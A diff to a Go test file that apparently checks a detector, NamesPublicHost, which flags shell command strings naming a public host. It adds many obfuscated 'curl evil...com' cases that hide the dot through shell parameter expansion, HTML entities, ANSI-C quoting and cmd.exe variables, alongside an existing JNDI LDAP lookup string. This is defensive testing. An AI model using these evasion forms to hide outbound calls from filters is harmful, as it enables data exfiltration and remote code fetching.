@@ -3,6 +3,7 @@ package cases
 import (
 	"bytes"
 	"reflect"
+	"strings"
 	"testing"
 )
 
@@ -122,6 +123,29 @@ func TestNamesPublicHost(t *testing.T) {
 		"ping${IFS}8''.8.8.8",
 		"curl evil$1.com",
 		"curl %22evil%22%2E%22com%22",
+		// Parameter expansions that can expand to nothing.
+		"curl evil${x:+}.com",
+		"curl evil${x:=}.com",
+		"curl evil${!x}.com",
+		"curl evil${x[0]}.com",
+		"curl evil${x:0:0}.com",
+		"curl evil${x%y}.com",
+		"curl evil${#x}.com",
+		"curl evil${x:-${y:-}}.com",
+		// Quotes and shell syntax written as HTML entities.
+		"curl evil&apos;&apos;.com",
+		"curl evil&quot;&quot;.com",
+		"curl evil&grave;&grave;.com",
+		"curl evil&dollar;&lcub;x&rcub;.com",
+		"curl evil&dollar;&lpar;&rpar;.com",
+		// ANSI-C quoting.
+		`curl evil$'\56'com`,
+		`curl evil$'\x2e'com`,
+		`curl evil$'\u002e'com`,
+		`curl evil$'\U0000002e'com`,
+		// cmd.exe variables.
+		"curl evil%x%.com",
+		"curl evil%x:~0,0%.com",
 	}
 	for _, s := range public {
 		if !NamesPublicHost(s) {
@@ -164,6 +188,12 @@ func TestNamesPublicHost(t *testing.T) {
 		"${jndi:ldap://callback.invalid/a}",
 		"${jndi:ldap://${x}callback.invalid/a}",
 		`echo '${x}' "$@"`,
+		"curl waf${x:+}.example.test",
+		"curl printer${!x}.local",
+		"set %PATH% and %x:~0,2%",
+		"it&apos;s &quot;fine&quot;",
+		`printf $'\56\n'`,
+		"${x:0:2} ${#x} ${x%y}",
 	}
 	for _, s := range local {
 		if NamesPublicHost(s) {
@@ -177,5 +207,12 @@ func TestNamesPublicHostTruncatedShellSyntax(t *testing.T) {
 	for _, s := range []string{"$", "\\", "${", "${a", "${a:", "${a:-", "${a-b", "${}", "$(", "a$", "a\\", "${a}}", "${a:-}"} {
 		NamesPublicHost(s) // must not panic
 		NamesPublicHost("x " + s + " y")
+	}
+	for _, s := range []string{"$'", "$'\\", "$'\\x", "$'\\u12", "%x", "%x:", "${a${", "${!", "${#}"} {
+		NamesPublicHost(s)
+	}
+	// Past its budget it refuses: deep nesting costs a view per level.
+	if !NamesPublicHost(strings.Repeat("${a:-", 1000) + "x" + strings.Repeat("}", 1000)) {
+		t.Error("deeply nested defaults were not refused")
 	}
 }
